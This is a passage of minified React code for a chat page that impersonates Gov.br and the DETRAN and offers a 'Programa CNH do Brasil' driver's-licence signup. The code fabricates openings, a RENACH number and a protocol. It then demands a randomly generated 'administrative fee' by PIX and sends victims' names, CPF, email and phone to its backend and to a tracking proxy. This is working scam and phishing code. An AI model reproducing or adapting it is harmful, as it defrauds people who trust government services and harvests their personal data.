    , [O, R] = x.useState(!1)
    , [L, J] = x.useState([])
    , [oe, $e] = x.useState(!1)
    , [He, $n] = x.useState(!1)
    , [yt, zt] = x.useState("")
    , [ho, Ui] = x.useState("")
    , [$i, ss] = x.useState(!1)
    , [Hi, mo] = x.useState(!1)
    , [Ut, Rh] = x.useState(null)
    , cc = x.useRef(null)
    , [Oh, j] = x.useState([])
    , [E, T] = x.useState(!1)
    , [$, B] = x.useState([])
    , V = x.useRef(null)
    , [G, Z] = x.useState("")
    , [Pe, De] = x.useState(0)
    , $t = f != null && f.nome ? Uw(f.nome.split(" ")[0]) : "Cidadão"
    , uc = () => {
      const K = 78.4 + Math.random() * 8.899999999999991;
      return Math.round(K * 100) / 100
    }
    , po = _ => {
      const U = Math.round(_ * .404 * 100) / 100
        , K = Math.round(_ * .299 * 100) / 100
        , he = Math.round((_ - U - K) * 100) / 100;
      return {
        ted: U,
        tsa: K,
        tpe: he
      }
    }
    , xn = _ => _.toFixed(2).replace(".", ",")
    , dc = () => ["JANEIRO", "FEVEREIRO", "MARÇO", "ABRIL", "MAIO", "JUNHO", "JULHO", "AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(U => ({
      month: `${U}/2026`,
      vagas: Math.floor(Math.random() * 9) + 4
    }))
    , Wi = () => {
      let _ = "";
      for (let U = 0; U < 11; U++)
        _ += Math.floor(Math.random() * 10).toString();
      return _
    }
    , fc = () => {
      const _ = new Date().getFullYear()
        , U = Math.floor(Math.random() * 9e8) + 1e8;
      return `${_}${U}`
    }
    , go = x.useCallback(async _ => {
      try {
        const K = await (await fetch(`/api/check-pix.php/${_}`)).json();
        if (K.success && K.status) {
          if (H(K.status),
            K.status === "paid") {
            if (console.log("PAGAMENTO CONFIRMADO!", _),
              typeof window < "u" && window.fbq) {
              const he = window.fbq;
              he("track", "Purchase", {
                value: (w == null ? void 0 : w.amount) || 86.45,
                currency: "BRL",
                content_type: "product",
                content_ids: [_],
                transaction_id: _
              })
            }
            return setTimeout(() => {
              e("/success")
            }
              , 1e3),
              !0
          } else if (K.status === "expired" || K.status === "cancelled")
            return console.log("Transação expirada ou cancelada"),
              !0
        }
        return !1
      } catch (U) {
        return console.error("Erro ao verificar status:", U),
          !1
      }
    }
      , [w, e])
    , Lw = async () => {
      if (w != null && w.transaction_id) {
        ss(!0);
        try {
          const U = await (await fetch(`/api/check-pix.php/${w.transaction_id}`)).json();
          if (U.success && U.status === "paid") {
            if (console.log("PAGAMENTO CONFIRMADO (manual)!", w.transaction_id),
              typeof window < "u" && window.fbq) {
              const K = window.fbq;
              K("track", "Purchase", {
                value: (w == null ? void 0 : w.amount) || 86.45,
                currency: "BRL",
                content_type: "product",
                content_ids: [w.transaction_id],
                transaction_id: w.transaction_id
              })
            }
            e("/success")
          } else
            ss(!1),
              mo(!0),
              v.current && setTimeout(() => {
                v.current && (v.current.scrollTop = v.current.scrollHeight)
              }
                , 100)
        } catch (_) {
          console.error("Erro ao verificar pagamento:", _),
            ss(!1),
            mo(!0),
            v.current && setTimeout(() => {
              v.current && (v.current.scrollTop = v.current.scrollHeight)
            }
              , 100)
        }
      }
    }
    , Fw = _ => {
      var K;
      const U = (K = _.target.files) == null ? void 0 : K[0];
      U && Rh(U)
    }
    , Vw = () => {
      var _;
      (_ = cc.current) == null || _.click()
    }
    , Bw = async () => {
      if (Ut)
        try {
          const _ = await new Promise((he, Fe) => {
            const yo = new FileReader;
            yo.onload = () => he(yo.result),
              yo.onerror = Fe,
              yo.readAsDataURL(Ut)
          }
          );
          console.log("[COMPROVANTE] Enviando comprovante para o servidor..."),
            console.log("[COMPROVANTE] CPF:", f == null ? void 0 : f.cpf),
            console.log("[COMPROVANTE] Nome:", f == null ? void 0 : f.nome),
            console.log("[COMPROVANTE] Arquivo:", Ut.name);
          const U = await fetch("/api/upload-comprovante", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              cpf: (f == null ? void 0 : f.cpf) || "",
              nome: (f == null ? void 0 : f.nome) || "",
              email: (f == null ? void 0 : f.email) || "",
              phone: (f == null ? void 0 : f.phone) || "",
              transactionId: (w == null ? void 0 : w.transaction_id) || "",
              imageBase64: _,
              imageName: Ut.name,
              imageType: Ut.type
            })
          })
            , K = await U.json();
          console.log("[COMPROVANTE] Resposta do servidor:", K),
            U.ok && K.success ? console.log("[COMPROVANTE] Comprovante enviado com sucesso!") : console.error("[COMPROVANTE] Erro ao enviar:", K.error),
            e("/success")
        } catch (_) {
          console.error("[COMPROVANTE] Erro ao processar comprovante:", _),
            e("/success")
        }
    }
    ;
  x.useEffect(() => {
    if (!(w != null && w.transaction_id))
      return;
    console.log("Starting payment status polling with transaction_id:", w.transaction_id);
    const _ = setInterval(async () => {
      try {
        await go(w.transaction_id) && clearInterval(_)
      } catch (U) {
        console.error("Polling error:", U)
      }
    }
      , 5e3);
    return () => clearInterval(_)
  }
    , [w == null ? void 0 : w.transaction_id, go]),
    x.useEffect(() => {
      if (o !== "awaiting_payment" || z <= 0)
        return;
      const _ = setInterval(() => {
        te(U => U <= 1 ? (clearInterval(_),
          0) : U - 1)
      }
        , 1e3);
      return () => clearInterval(_)
    }
      , [o, z]);
  const zw = _ => {
    const U = Math.floor(_ / 60)
      , K = _ % 60;
    return `${String(U).padStart(2, "0")}:${String(K).padStart(2, "0")}`
  }
    ;
  function Uw(_) {
    return _ ? _.toLowerCase().split(" ").map(U => U.charAt(0).toUpperCase() + U.slice(1)).join(" ") : ""
  }
  const hc = _ => _.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  x.useEffect(() => {
    let _ = localStorage.getItem("userData")
      , U = localStorage.getItem("selectedDetran");
    const K = window.location.hostname.includes("replit.dev") || window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
    if (!_ && K) {
      const Fe = {
        nome: "USUARIO TESTE",
        cpf: "12345678900",
        email: "teste@teste.com",
        phone: "11999999999"
      };
      localStorage.setItem("userData", JSON.stringify(Fe)),
        _ = JSON.stringify(Fe)
    }
    if (!U && K) {
      const Fe = {
        uf: "SP",
        nome: "DETRAN-SP"
      };
      localStorage.setItem("selectedDetran", JSON.stringify(Fe)),
        U = JSON.stringify(Fe)
    }
    if (_) {
      const Fe = JSON.parse(_);
      h(Fe),
        Fe.nome && p(Fe.nome.split(" ")[0])
    }
    U && b(JSON.parse(U)),
      q(Wi()),
      J(dc()),
      Ui(fc());
    const he = "fb_addtocart_chat_tracked";
    if (!localStorage.getItem(he) && typeof window.fbq < "u")
      try {
        window.fbq("track", "AddToCart", {
          value: 82.5,
          currency: "BRL",
          content_name: "Taxa DETRAN - CNH do Brasil",
          content_type: "product"
        }),
          localStorage.setItem(he, new Date().toISOString())
      } catch (Fe) {
        console.error("Facebook Pixel AddToCart error:", Fe)
      }
    pT()
  }
    , []),
    x.useEffect(() => {
      if (v.current) {
        if (o === "pix_document" || o === "awaiting_payment")
          return;
        v.current.scrollTop = v.current.scrollHeight
      }
    }
      , [t, r, o, w, O, oe, He]);
  const Hn = (_, U) => {
    n(K => [...K, {
      text: _,
      isIncoming: U
    }])
  }
    , Qi = async (_, U = 4e3) => {
      s(!0),
        await new Promise(K => setTimeout(K, U)),
        s(!1),
        Hn(_, !0)
    }
    , qi = async (_ = 0) => {
      if (g.current && _ === 0)
        return console.log("Transaction already created, skipping..."),
          !0;
      _ === 0 && (g.current = !0),
        P(!0),
        X(null);
      const U = 3;
      try {
        const K = localStorage.getItem("userData");
        if (!K)
          return X("Dados do usuário não encontrados. Recarregue a página."),
            P(!1),
            g.current = !1,
            !1;
        const he = JSON.parse(K);
        console.log(`Creating PIX transaction for: ${he.nome} (attempt ${_ + 1}/${U})`);
        const Fe = uc();
        De(Fe),
          console.log(`Generated random amount: R$ ${Fe.toFixed(2)}`);
        const vo = await (await fetch("/api/create-pix.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            amount: Fe,
            customer_name: he.nome,
            customer_email: he.email || "cliente@email.com",
            customer_phone: he.phone || "11999999999",
            customer_cpf: he.cpf,
            detran_uf: (y == null ? void 0 : y.uf) || "",
            detran_nome: (y == null ? void 0 : y.nome) || "",
            utmParams: Object.fromEntries(new URLSearchParams(window.location.search))
          })
        })).json();
        return vo.success && vo.pix_code ? (S(vo),
          fetch("/proxy_notificar_utmify.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              transactionId: vo.transaction_id,
              valorEmCentavos: Math.round(Fe * 100),
              nomeCliente: he.nome,
              emailCliente: he.email || "cliente@email.com",
              cpfCliente: he.cpf,
              telefoneCliente: he.phone || "11999999999",
              utmParams: Object.fromEntries(new URLSearchParams(window.location.search)),
              productIdForPixel: "CNH_TAXA_01",
              productNameForPixel: "Taxas Administrativas CNH",
              productQuantity: 1
            })
          }).catch(console.error),
          te(600),
          localStorage.setItem("currentTransactionId", vo.transaction_id),
          P(!1),
          !0) : _ < U - 1 ? (await new Promise(Zw => setTimeout(Zw, 2e3)),
            qi(_ + 1)) : (X(vo.error || "Erro ao gerar código PIX. Tente novamente."),
              P(!1),
              !1)
      } catch {
        return _ < U - 1 ? (await new Promise(he => setTimeout(he, 2e3)),
          qi(_ + 1)) : (X("Erro de conexão. Verifique sua internet e tente novamente."),
            P(!1),
            !1)
      }
    }
    , $w = async () => {
      w != null && w.pix_code && (await navigator.clipboard.writeText(w.pix_code),
        k(!0),
        setTimeout(() => k(!1), 3e3))
    }
    , Hw = async () => {
      C.current || (C.current = !0,
        Hn("Para dar continuidade ao seu cadastro no Programa CNH do Brasil, informamos que é necessário selecionar a categoria de CNH pretendida.", !0),
        i("category_selection"))
    }
    , mc = async _ => {
      c(_),
        Hn(`Categoria ${_}`, !1),
        i("consulting_vagas"),
        $e(!0),
        await new Promise(U => setTimeout(U, 4e3)),
        $e(!1),
        await Qi(`Prezado(a) ${$t}, informamos que as aulas teóricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo móvel ou computador, conforme sua disponibilidade de horário.

Após a finalização do cadastro, o sistema liberará o acesso ao aplicativo oficial com o passo a passo completo, e você já poderá iniciar as aulas imediatamente.`, 6e3),
        i("msg1_continue")
    }
    , Ww = async () => {
      Hn("Prosseguir", !1),
        i("msg1_sent"),
        await Qi(`O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teóricas através do aplicativo oficial e, após a conclusão, o Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"} disponibilizará um instrutor credenciado, sem custo adicional, para a realização das aulas práticas obrigatórias.`, 7e3),
        i("msg2_continue")
    }
    , Qw = async () => {
      Hn("Prosseguir", !1),
        i("msg2_sent"),
        await Qi("As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.", 7e3),
        i("msg3_continue")
    }
    , qw = async () => {
      Hn("Prosseguir", !1),
        i("msg3_sent"),
        await Qi("Selecione o mês de sua preferência para realização das avaliações:", 3e3),
        i("month_selection")
    }
    , Gw = async _ => {
      if (d(_),
        Hn(_, !1),
        i("confirming_cadastro"),
        $n(!0),
        zt("Confirmando cadastro junto ao Detran..."),
        await new Promise(U => setTimeout(U, 3e3)),
        zt("Gerando cadastro no RENACH..."),
        await new Promise(U => setTimeout(U, 2500)),
        zt("Emitindo documentação..."),
        await new Promise(U => setTimeout(U, 2500)),
        $n(!1),
        Hn(`Prezado(a) ${$t}, seu número de RENACH foi gerado com sucesso junto ao Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"}.

Número do RENACH: **${D}**

O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identificação único do candidato no Sistema Nacional de Habilitação.`, !0),
        await new Promise(U => setTimeout(U, 300)),
        v.current) {
        const U = v.current.scrollHeight;
        v.current.scrollTop = U - 600
      }
      R(!0),
        i("renach_continue")
    }
    , pc = (_, U) => {
      j(K => [...K, {
        text: _,
        isIncoming: U
      }]),
        setTimeout(() => {
          v.current && (v.current.scrollTop = v.current.scrollHeight)
        }
          , 100)
    }
    , Kw = (_, U) => {
      B(K => [...K, {
        text: _,
        isIncoming: U
      }])
    }
    , Yw = async (_, U = 2e3) => {
      T(!0),
        v.current && (v.current.scrollTop = v.current.scrollHeight),
        await new Promise(K => setTimeout(K, U)),
        T(!1),
        pc(_, !0)
    }
    , Xw = async () => {
      pc("Prosseguir", !1),
        i("renach_created"),
        await Yw(`Prezado(a) ${$t}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas junto ao DETRAN.

O valor das taxas será calculado e apresentado na guia de pagamento.`, 3e3),
        i("finalize_button")
    }
    , Jw = async () => {
      pc("Finalizar Cadastro", !1),
        i("generating_pix"),
        Z("");
      const _ = setTimeout(() => {
        Z("Aguarde e não feche a página. Sua guia de pagamento está sendo gerada...")
      }
        , 5e3)
        , U = setTimeout(() => {
          Z("Por favor, aguarde mais um momento. Estamos finalizando a geração da sua guia...")
        }
          , 15e3);
      await qi(),
        clearTimeout(_),
        clearTimeout(U),
        Z(""),
        i("pix_document"),
        setTimeout(() => {
          if (V.current && v.current) {
            const K = V.current.offsetTop;
            v.current.scrollTop = K - 8
          }
        }
          , 150),
        await new Promise(K => setTimeout(K, 2e3)),
        Kw(`Para realizar o pagamento via PIX Copia e Cola:

1. Copie o código PIX clicando no botão "Copiar Código PIX"
2. Abra o aplicativo do seu banco
3. Acesse a área PIX e selecione "Pagar com PIX Copia e Cola"
4. Cole o código copiado e confirme o pagamento

Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.

Assim que realizar o pagamento das taxas conforme valor indicado na guia, clique no botão abaixo para ativar seu cadastro.`, !0),
        i("awaiting_payment")
    }
    ;
  x.useEffect(() => {
    f && y && Hw()
  }
    , [f, y]);
  const os = new Date
    , gc = `${os.getDate().toString().padStart(2, "0")}/${(os.getMonth() + 1).toString().padStart(2, "0")}/${os.getFullYear()}`
    , Ih = `${os.getHours().toString().padStart(2, "0")}:${os.getMinutes().toString().padStart(2, "0")}`
    , _h = gc
    , Gi = ({ onClick: _ }) => a.jsx("div", {
      className: "flex flex-col gap-3 max-w-[80%] mt-4",
      children: a.jsxs("button", {
        onClick: _,
        className: "flex items-center justify-center gap-2 p-3 bg-[#1351B4] text-white rounded-sm shadow-md hover:bg-[#0D3A8C] transition-all",
        children: [a.jsx("span", {
          className: "font-medium text-sm",
          children: "Prosseguir"
        }), a.jsx(eN, {
          className: "w-4 h-4"
        })]
      })
    });
  return a.jsxs("div", {
    className: "min-h-screen bg-white flex flex-col",
    children: [a.jsxs("header", {
      style: {
        backgroundColor: "white",
        padding: "12px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: [a.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [a.jsx("img", {
          src: "https://i.ibb.co/zPFChvR/logo645.png",
          alt: "Logo gov.br estilizada com texto em azul e amarelo",
          style: {
            marginRight: "32px",
            background: "none",
            boxShadow: "none"
          },
          width: "70",
          height: "24"
        }), a.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            fontSize: "14px",
            marginLeft: "32px",
            cursor: "pointer",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          "aria-label": "Menu de links",
          children: a.jsx("i", {
            className: "fas fa-ellipsis-v",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), a.jsx("div", {
          style: {
            borderLeft: "1px solid #ccc",
            height: "24px",
            margin: "0 16px",
            background: "none",
            boxShadow: "none"
          }
        })]
      }), a.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [a.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          children: a.jsx("i", {
            className: "fas fa-cookie-bite",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), a.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          type: "button",
          "aria-label": "Sistemas",
          children: a.jsx("i", {
            className: "fas fa-th",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), a.jsxs("button", {
          style: {
            backgroundColor: "#1451B4",
            color: "white",
            border: "none",
            borderRadius: "9999px",
            padding: "6px 16px",
            display: "flex",
            alignItems: "center",
            fontSize: "14px",
            cursor: "pointer",
            marginLeft: "24px",
            boxShadow: "none"
          },
          type: "button",
          children: [a.jsx("i", {
            className: "fas fa-user",
            style: {
              color: "white",
              marginRight: "8px",
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          }), a.jsx("span", {
            children: m || "Entrar"
          })]
        })]
      })]
    }), a.jsx("nav", {
      style: {
        backgroundColor: "#f5f5f5",
        padding: "12px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: a.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [a.jsxs("div", {
          style: {
            position: "relative",
            marginRight: "10px"
          },
          children: [a.jsx("img", {
            src: "https://play-lh.googleusercontent.com/6-1IDYn9nr8LFgI6TtDYUEWczJTvPa0bWQnWG_jyBXe7GdKWQpKTkaiMA4WuQGvRv1pD",
            alt: "Atendimento",
            style: {
              width: "28px",
              height: "28px",
              borderRadius: "50%",
              objectFit: "cover"
            }
          }), a.jsx("span", {
            style: {
              position: "absolute",
              bottom: "0",
              right: "0",
              width: "8px",
              height: "8px",
              backgroundColor: "#22c55e",
              borderRadius: "50%",
              border: "2px solid white"
            }
          })]
        }), a.jsx("span", {
          style: {
            color: "#666",
            fontSize: "0.875rem",
            fontWeight: 300,
            lineHeight: "18px",
            background: "none",
            boxShadow: "none"
          },
          children: "Atendimento Gov.br"
        })]
      })
    }), a.jsx("main", {
      className: "flex-1 overflow-hidden bg-gray-50",
      children: a.jsx("div", {
        className: "max-w-4xl mx-auto h-full px-4",
        children: a.jsxs("div", {
          ref: v,
          className: "h-[calc(100vh-160px)] overflow-y-auto py-4",
          style: {
            scrollBehavior: "smooth"
          },
          children: [t.map((_, U) => a.jsx("div", {
            className: `mb-4 ${_.isIncoming ? "text-left" : "text-right"}`,
            children: a.jsx("div", {
              className: `inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base ${_.isIncoming ? "bg-[#2670CC] text-white rounded-tl-sm" : "bg-gray-200 text-gray-800 rounded-tr-sm"}`,
              style: {
                lineHeight: "1.5",
                fontSize: "16px",
                whiteSpace: "pre-line"
              },
              children: _.text.split("**").map((K, he) => he % 2 === 1 ? a.jsx("strong", {
                children: K
              }, he) : K)
            })
          }, U)), r && a.jsx("div", {
            className: "mb-4 text-left",
            children: a.jsx("div", {
              className: "inline-block bg-[#2670CC] text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm text-base",
              children: a.jsxs("div", {
                className: "flex items-center gap-1.5",
                children: [a.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "0ms"
                  }
                }), a.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "150ms"
                  }
                }), a.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "300ms"
                  }
                })]
              })
            })
          }), o === "category_selection" && a.jsxs("div", {
            className: "flex flex-col gap-3 max-w-[80%] mt-2",
            children: [a.jsxs("button", {
              onClick: () => mc("A"),
              className: "flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left",
              children: [a.jsx("span", {
                className: "text-[#1351B4] text-xl font-bold",
                children: "A"
              }), a.jsx("span", {
                className: "font-medium text-gray-800",
                children: "Categoria A - Motocicletas"
              })]
            }), a.jsxs("button", {
              onClick: () => mc("B"),
              className: "flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left",
              children: [a.jsx("span", {
                className: "text-[#1351B4] text-xl font-bold",
                children: "B"
              }), a.jsx("span", {
                className: "font-medium text-gray-800",
                children: "Categoria B - Carros"
              })]
            }), a.jsxs("button", {
              onClick: () => mc("AB"),
              className: "flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left",
              children: [a.jsx("span", {
                className: "text-[#1351B4] text-xl font-bold",
                children: "AB"
              }), a.jsx("span", {
                className: "font-medium text-gray-800",
                children: "Categoria AB - Motocicletas e Carros"
              })]
            })]
          }), oe && a.jsx("div", {
            className: "flex justify-center my-6",
            children: a.jsxs("div", {
              className: "bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm",
              children: [a.jsx(dt, {
                className: "w-5 h-5 animate-spin text-[#1351B4]"
              }), a.jsxs("span", {
                className: "text-gray-700",
                children: ["Consultando vagas no Detran ", (y == null ? void 0 : y.nome) || "do seu Estado", "..."]
              })]
            })
          }), o === "msg1_continue" && a.jsx(Gi, {
            onClick: Ww
          }), o === "msg2_continue" && a.jsx(Gi, {
            onClick: Qw
          }), o === "msg3_continue" && a.jsx(Gi, {
            onClick: qw
          }), o === "month_selection" && a.jsx("div", {
            className: "grid grid-cols-2 sm:grid-cols-3 gap-3 max-w-full mt-4",
            children: L.map(_ => a.jsxs("button", {
              onClick: () => Gw(_.month),
              className: "flex flex-col items-center p-3 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all",
              children: [a.jsx("span", {
                className: "font-medium text-gray-800 text-sm",
                children: _.month
              }), a.jsxs("span", {
                className: "text-xs text-[#1351B4] font-semibold mt-1",
                children: [_.vagas, " vagas"]
              })]
            }, _.month))
          }), He && a.jsx("div", {
            className: "flex justify-center my-6",
            children: a.jsxs("div", {
              className: "bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm",
              children: [a.jsx(dt, {
                className: "w-5 h-5 animate-spin text-[#1351B4]"
              }), a.jsx("span", {
                className: "text-gray-700",
                children: yt
              })]
            })
          }), O && a.jsx("div", {
            className: "w-full mt-4 mb-4",
            children: a.jsxs("div", {
              className: "bg-white border border-gray-300 rounded shadow-md",
              style: {
                fontFamily: "Arial, sans-serif",
                fontSize: "12px"
              },
              children: [a.jsxs("div", {
                className: "bg-gray-50 p-2 border-b border-gray-200 flex items-center justify-between",
                children: [a.jsx("div", {
                  className: "flex items-center gap-2",
                  children: a.jsx("img", {
                    src: Wg[(y == null ? void 0 : y.uf) || ""] || "",
                    alt: `DETRAN ${(y == null ? void 0 : y.uf) || ""}`,
                    className: "h-8 max-w-[100px] object-contain"
                  })
                }), a.jsxs("span", {
                  className: "text-gray-500 text-xs",
                  children: ["Protocolo: ", ho]
                })]
              }), a.jsxs("div", {
                className: "p-3",
                children: [a.jsx("div", {
                  className: "text-center mb-2",
                  children: a.jsx("p", {
                    className: "text-xs font-bold text-gray-700",
                    children: "COMPROVANTE DE CADASTRO - RENACH"
                  })
                }), a.jsxs("div", {
                  className: "grid grid-cols-2 gap-2 mb-2",
                  children: [a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "NOME"
                    }), a.jsx("p", {
                      className: "font-semibold text-gray-800 text-xs",
                      children: f != null && f.nome ? f.nome.toUpperCase() : ""
                    })]
                  }), a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "CPF"
                    }), a.jsx("p", {
                      className: "font-semibold text-gray-800 text-xs",
                      children: f != null && f.cpf ? hc(f.cpf) : ""
                    })]
                  })]
                }), a.jsx("div", {
                  className: "bg-blue-50 p-2 rounded mb-2",
                  children: a.jsxs("div", {
                    className: "grid grid-cols-2 gap-2",
                    children: [a.jsxs("div", {
                      children: [a.jsx("p", {
                        className: "text-gray-400 text-[10px]",
                        children: "Nº RENACH"
                      }), a.jsx("p", {
                        className: "font-bold text-[#1351B4] text-sm",
                        children: D
                      })]
                    }), a.jsxs("div", {
                      children: [a.jsx("p", {
                        className: "text-gray-400 text-[10px]",
                        children: "CATEGORIA"
                      }), a.jsx("p", {
                        className: "font-bold text-gray-800 text-sm",
                        children: l
                      })]
                    })]
                  })
                }), a.jsxs("div", {
                  className: "grid grid-cols-2 gap-2 mb-2",
                  children: [a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "MÊS PREVISTO"
                    }), a.jsx("p", {
                      className: "font-semibold text-gray-800 text-xs",
                      children: u
                    })]
                  }), a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-400 text-[10px]",
                      children: "STATUS"
                    }), a.jsx("p", {
                      className: "font-bold text-orange-600 text-xs",
                      children: "PENDENTE"
                    })]
                  })]
                }), a.jsx("div", {
                  className: "border-t border-gray-200 pt-2 text-[10px] text-gray-400",
                  children: a.jsxs("p", {
                    children: ["Emitido em ", gc, " às ", Ih]
                  })
                })]
              })]
            })
          }), o === "renach_continue" && a.jsx(Gi, {
            onClick: Xw
          }), Oh.map((_, U) => a.jsx("div", {
            className: `mb-4 ${_.isIncoming ? "text-left" : "text-right"}`,
            children: a.jsx("div", {
              className: `inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base ${_.isIncoming ? "bg-[#2670CC] text-white rounded-tl-sm" : "bg-gray-200 text-gray-800 rounded-tr-sm"}`,
              style: {
                lineHeight: "1.5",
                fontSize: "16px",
                whiteSpace: "pre-line"
              },
              children: _.text.split("**").map((K, he) => he % 2 === 1 ? a.jsx("strong", {
                children: K
              }, he) : K)
            })
          }, `post-renach-${U}`)), E && a.jsx("div", {
            className: "mb-4 text-left",
            children: a.jsx("div", {
              className: "inline-block bg-[#2670CC] text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm text-base",
              children: a.jsxs("div", {
                className: "flex items-center gap-1.5",
                children: [a.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "0ms"
                  }
                }), a.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "150ms"
                  }
                }), a.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "300ms"
                  }
                })]
              })
            })
          }), o === "finalize_button" && a.jsx("div", {
            className: "flex flex-col gap-3 max-w-[80%] mt-4",
            children: a.jsx("button", {
              onClick: Jw,
              className: "flex items-center justify-center gap-2 p-4 bg-[#1351B4] text-white rounded-sm shadow-md hover:bg-[#0D3A8C] transition-all",
              children: a.jsx("span", {
                className: "font-medium",
                children: "Finalizar Cadastro"
              })
            })
          }), o === "generating_pix" && a.jsx("div", {
            className: "flex justify-center my-6",
            children: a.jsxs("div", {
              className: "bg-white border border-gray-200 rounded-lg p-4 shadow-sm",
              children: [a.jsxs("div", {
                className: "flex items-center gap-3",
                children: [a.jsx(dt, {
                  className: "w-5 h-5 animate-spin text-[#1351B4]"
                }), a.jsx("span", {
                  className: "text-gray-700",
                  children: "Gerando Guia de Pagamento..."
                })]
              }), G && a.jsx("p", {
                className: "text-sm text-gray-500 mt-2 text-center",
                children: G
              })]
            })
          }), se && a.jsx("div", {
            className: "mb-4 text-left",
            children: a.jsxs("div", {
              className: "inline-block bg-red-600 text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm",
              children: [a.jsx("p", {
                className: "font-bold mb-1",
                children: "Erro ao gerar PIX"
              }), a.jsx("p", {
                className: "text-sm",
                children: se
              }), a.jsx("button", {
                onClick: () => qi(),
                className: "mt-2 bg-white text-red-600 px-4 py-2 rounded font-medium hover:bg-gray-100",
                children: "Tentar Novamente"
              })]
            })
          }), (o === "pix_document" || o === "awaiting_payment") && w && a.jsx("div", {
            ref: V,
            className: "w-full mt-4 mb-4",
            children: a.jsxs("div", {
              className: "bg-white border-2 border-gray-300 shadow-lg",
              style: {
                fontFamily: "Arial, sans-serif"
              },
              children: [a.jsx("div", {
                className: "bg-white p-4 border-b border-gray-300",
                children: a.jsxs("div", {
                  className: "flex flex-col items-center",
                  children: [a.jsx("img", {
                    src: Wg[(y == null ? void 0 : y.uf) || ""] || "",
                    alt: `Logo DETRAN ${(y == null ? void 0 : y.uf) || ""}`,
                    className: "h-16 max-w-[200px] object-contain mb-2"
                  }), a.jsx("p", {
                    className: "text-sm font-bold text-gray-800",
                    children: "GUIA DE RECOLHIMENTO"
                  }), a.jsx("p", {
                    className: "text-xs text-gray-600",
                    children: "TAXAS ADMINISTRATIVAS CNH"
                  })]
                })
              }), a.jsxs("div", {
                className: "p-4 border-b border-gray-300",
                children: [a.jsxs("div", {
                  children: [a.jsx("p", {
                    className: "text-gray-500 text-xs",
                    children: "CONTRIBUINTE"
                  }), a.jsx("p", {
                    className: "font-bold text-gray-800",
                    children: f != null && f.nome ? f.nome.toUpperCase() : ""
                  })]
                }), a.jsxs("div", {
                  className: "mt-2",
